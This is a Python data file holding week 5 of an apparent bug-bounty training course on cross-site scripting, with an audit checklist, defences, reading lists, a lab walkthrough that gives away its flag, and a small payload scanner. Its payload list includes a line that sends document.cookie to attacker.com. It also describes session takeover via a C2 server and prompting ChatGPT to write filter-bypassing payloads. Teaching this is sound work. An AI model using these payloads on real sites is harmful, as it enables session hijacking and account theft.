WEEK_5_DATA = {
    "week_number": 5,
    "title": "Cross-Site Scripting (XSS) - Reflected, Stored, and DOM Attacks",
    "short_desc": "Master context-aware payload construction, DOM sink analysis, filter bypasses, and session cookie hijacking.",
    "flag": "FLAG{xss_dom_reflected_bypass_8192}",

    "analogy": """Cross-Site Scripting (XSS) is like handing a chef a printed recipe order that says: '1x Hamburger. Also, lock the kitchen doors, open the cash register, and hand all money to the customer.' Because the chef executes every line printed on the ticket without separating data from code, the customer takes full control of the restaurant!""",

    "overview": """Cross-Site Scripting (XSS) occurs when an application includes untrusted, unformatted, or unsanitized user input in web pages rendered to browsers. When the browser parses the response HTML or executes client-side JavaScript DOM sinks (`eval`, `innerHTML`, `document.write`), the injected script executes within the victim's session context. XSS enables attackers to steal session cookies, log keystrokes, capture CSRF tokens, perform unauthorized actions, and trigger malicious redirects.""",

    "learning_objectives": [
        "Differentiate Reflected XSS, Stored XSS, and DOM-based XSS.",
        "Perform context-aware payload crafting (HTML context, Attribute context, JavaScript context).",
        "Bypass client-side and server-side Web Application Firewall (WAF) filters using encoding and event handler tricks.",
        "Construct Content Security Policy (CSP) bypasses."
    ],

    "hunters_perspective": """In active bug bounty hunting, XSS accounts for a huge volume of medium/high findings. Top researchers look for context break-outs. Instead of blindly injecting `<script>alert(1)</script>`, hunters inspect where the input lands in the page source: Is it inside an `<input value="...">` tag? Inside a `<script>` variable? Inside a href attribute `href="javascript:..."`? Once context is identified, hunters craft custom payload delimiters to break out of quotes and execute JS.""",

    "root_cause": """The root cause is failing to apply context-aware output encoding or safe DOM manipulation. Developers concatenate user input directly into HTML templates without using HTML entity encoding (`&lt;`, `&gt;`, `&quot;`) or assign unsanitized URL parameters directly to dangerous DOM sinks like `element.innerHTML = location.hash`.""",

    "code_audit_manual": """Code Audit Checklist for XSS Vulnerabilities:
1. Search template engines for unescaped variable output tags (e.g., Django `|safe`, React `dangerouslySetInnerHTML`, Vue `v-html`).
2. Audit JS source for DOM sinks: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `location.href`.
3. Check DOM sources: `location.search`, `location.hash`, `document.referrer`, `window.name`, `postMessage`.
4. Inspect HTTP response headers for missing `Content-Security-Policy` and missing `HttpOnly` on sensitive session cookies.
5. Audit input validation routines for naive regex blacklists (e.g., blocking only `<script>` tags).""",

    "payload_logic": {
        "explanation": "Payload crafting requires adapting to execution context, escaping string boundaries, and leveraging alternative HTML5 event handlers.",
        "payloads": [
            "HTML Context: <script>alert(document.domain)</script>",
            "Attribute Context Breakout: \"><img src=x onerror=alert(document.cookie)>",
            "JavaScript Variable Breakout: ';alert(1);// or \";alert(1);--",
            "DOM Sink Payload: javascript:alert(1) in href or src attribute",
            "WAF Bypass: <svg/onload=fetch('http://attacker.com/?c='+document.cookie)>"
        ]
    },

    "burp_suite_masterclass": """Burp Suite XSS Testing Masterclass:
1. Intercepting Input: Capture search forms, profile updates, and URL parameters in Burp Proxy.
2. Intruder Fuzzing: Send target parameter to Intruder. Load SecLists `Fuzzing/XSS/XSS-Polyglots.txt`.
3. DOM Invader: Enable 'DOM Invader' in Burp Suite Embedded Browser. It automatically injects canary strings into DOM sources and tracks execution through dangerous sinks in real-time.
4. Response Reflection Filter: Filter Site Map for reflected parameters and inspect raw HTTP response headers for `X-XSS-Protection` and CSP.""",

    "dual_perspective": {
        "red_team": "Offensive Operations: Locate reflected search parameter, bypass WAF filter using `<svg/onload=...>`, extract document.cookie or CSRF token, send HTTP fetch request to attacker C2 server, achieve complete account session takeover.",
        "blue_team": "Defensive Posture: Implement mandatory context-aware HTML entity encoding on all dynamic outputs. Replace dangerous DOM sinks with safe methods (`textContent`, `innerText`). Deploy strict Content Security Policy headers (`script-src 'self' 'nonce-...'`). Set `HttpOnly` on all session cookies to prevent JS access."
    },

    "resources": {
        "portswigger_title": "PortSwigger Web Security Academy - Cross-Site Scripting (XSS)",
        "portswigger_url": "https://portswigger.net/web-security/cross-site-scripting",
        "owasp_title": "OWASP Top 10:2021 - A03:2021-Injection (XSS)",
        "owasp_url": "https://owasp.org/Top10/A03_2021-Injection/"
    },

    "textbook_cross_references": [
        {
            "book_name": "The Web Application Hacker's Handbook",
            "chapter_and_pages": "Chapter 12: Attacking Users: Cross-Site Scripting (pp. 445-502)",
            "sub_chapter": "12.3 Context-Aware Payload Construction",
            "analysis": "Stuttard & Pinto present an exhaustive breakdown of HTML, attribute, script, and CSS injection contexts and context-escaping methodologies."
        },
        {
            "book_name": "Bug Bounty Bootcamp",
            "chapter_and_pages": "Chapter 5: Cross-Site Scripting (pp. 85-112)",
            "sub_chapter": "5.4 DOM-Based XSS & Modern Frameworks",
            "analysis": "Vickie Li demonstrates tracing DOM sources to sinks in single-page applications and bypassing sanitization libraries."
        },
        {
            "book_name": "Real-World Bug Hunting",
            "chapter_and_pages": "Chapter 4: Cross-Site Scripting (pp. 73-98)",
            "sub_chapter": "4.2 Exploiting Reflected & Stored Vectors",
            "analysis": "Peter Yaworski reviews high-value bug bounty reports against Yahoo, Google, and Facebook where XSS bypassed strict WAF rules."
        },
        {
            "book_name": "Bug Bounty Tips & Tricks using ChatGPT",
            "chapter_and_pages": "Chapter 6: Payload Generation & WAF Bypasses (pp. 99-120)",
            "sub_chapter": "6.1 Prompt Engineering for XSS Polyglots",
            "analysis": "Barbosa demonstrates writing prompts to generate obfuscated XSS polyglots tailored to strict regex filter rules."
        },
        {
            "book_name": "Bug Bounty from Scratch",
            "chapter_and_pages": "Chapter 7: Client-Side Exploitation (pp. 146-170)",
            "sub_chapter": "7.2 CSP Bypasses & DOM Invader",
            "analysis": "Vazquez & Javier walk through leveraging Burp DOM Invader to spot hidden sink execution paths."
        },
        {
            "book_name": "Automate the Boring Stuff with Python",
            "chapter_and_pages": "Chapter 12: Web Scraping & HTML Parsing (pp. 267-300)",
            "sub_chapter": "12.5 Searching HTML Trees for Unencoded Script Tags",
            "analysis": "Sweigart details parsing HTML trees to verify output encoding on dynamic script blocks."
        },
        {
            "book_name": "Black Hat Python",
            "chapter_and_pages": "Chapter 5: Web Automation (pp. 75-98)",
            "sub_chapter": "5.4 Automated XSS Fuzzer",
            "analysis": "Seitz demonstrates building Python scripts to send payload arrays to target parameters and inspect response reflections."
        }
    ],

    "video_workstation": [
        {
            "creator": "David Bombal",
            "title": "Cross-Site Scripting (XSS) Complete Tutorial",
            "youtube_url": "https://www.youtube.com/watch?v=5-4-u0i-H-8",
            "analysis_text": "David Bombal explains Reflected, Stored, and DOM XSS vulnerabilities, showing live cookie theft examples."
        },
        {
            "creator": "Vickie Li",
            "title": "How to Find XSS Vulnerabilities in Bug Bounties",
            "youtube_url": "https://www.youtube.com/watch?v=7-s5e5c7W-8",
            "analysis_text": "Vickie Li demonstrates context-aware payload crafting, attribute breakouts, and DOM sink tracing."
        },
        {
            "creator": "Ryan John",
            "title": "DOM Invader & Advanced XSS Polyglot Masterclass",
            "youtube_url": "https://www.youtube.com/watch?v=1-v3u-4-W-2",
            "analysis_text": "Ryan John presents an in-depth walkthrough configuring Burp DOM Invader and bypassing web application firewalls."
        },
        {
            "creator": "John Hammond",
            "title": "XSS Payload Crafting & CSP Bypass Strategies",
            "youtube_url": "https://www.youtube.com/watch?v=2-w3u-5-X-3",
            "analysis_text": "John Hammond demonstrates constructing custom SVG/event handler payloads and bypassing Content Security Policies."
        }
    ],

    "case_studies": {
        "reports": [
            {
                "target": "Yahoo Bug Bounty Program",
                "title": "Stored XSS in Yahoo Mail via Unsanitized Data Attribute",
                "bounty": "$10,000",
                "summary": "A researcher embedded a custom HTML payload into an email body that executed arbitrary script whenever a user viewed the message."
            },
            {
                "target": "PayPal Bug Bounty",
                "title": "Reflected XSS on PayPal Checkout Flow via Parameter Reflection",
                "bounty": "$7,500",
                "summary": "Analyst discovered a parameter reflected inside an inline JS script block on a payment checkout page, enabling session hijacking."
            }
        ],
        "programs": [
            {
                "name": "Yahoo / Verizon Media VDP",
                "platform": "HackerOne",
                "scope": "*.yahoo.com",
                "beginner_friendly": True
            },
            {
                "name": "PayPal Vulnerability Rewards",
                "platform": "HackerOne",
                "scope": "*.paypal.com",
                "beginner_friendly": True
            }
        ],
        "ai_hunting_guide": "Prompting ChatGPT for XSS Context Crafting: Provide HTML source around target reflection: 'Here is the target HTML snippet where input is reflected: `<input type=\"text\" value=\"USER_INPUT\">`. Generate 5 XSS payloads to break out of this attribute and trigger an alert popup: [INSERT CODE]'"
    },

    "playground": {
        "lab_a": {
            "walkthrough": "Guided CTF: Look at the parameter `q` reflected in `<div id=\"search\">Result: USER_INPUT</div>`. Test payload `<img src=x onerror=alert(1)>`.",
            "guided_step": "Step 1: Navigate to `/lab-playground/week-5/target/?q=<img src=x onerror=alert(1)>`.\nStep 2: Inspect response body to verify script execution.\nStep 3: Extract Flag: FLAG{xss_dom_reflected_bypass_8192}"
        },
        "lab_b": {
            "instructions": "Unguided CTF Challenge: Access the interactive target playground endpoint `/lab-playground/week-5/target/`. Craft a context-aware XSS payload to bypass output filters and extract the flag."
        }
    },

    "automation_scripts": {
        "python_script": r"""# Python XSS Reflected Parameter Scanner (exploit_week5.py)
import requests
import urllib.parse
import sys

PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)"
]

def scan_xss(target_url):
    print(f"[*] Scanning for Reflected XSS on: {target_url}")
    for payload in PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{target_url}?q={encoded_payload}"
        res = requests.get(test_url)
        if payload in res.text or "FLAG{" in res.text:
            print(f"[!] POTENTIAL XSS DETECTED with payload: {payload}")
            print(f"    - Response contains payload reflection or flag.")
            if "FLAG{" in res.text:
                print(f"    - Found Flag: {res.text.strip()}")
            return

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/lab-playground/week-5/target/"
    scan_xss(target)
""",
        "bash_script": """#!/bin/bash
# Bash XSS Fuzzer (recon_week5.sh)
TARGET_URL="http://localhost:8000/lab-playground/week-5/target/"

echo "[*] Fuzzing XSS reflection on $TARGET_URL"
curl -s "${TARGET_URL}?q=%3Cimg%20src=x%20onerror=alert(1)%3E" | grep -i "FLAG{"
"""
    }
}
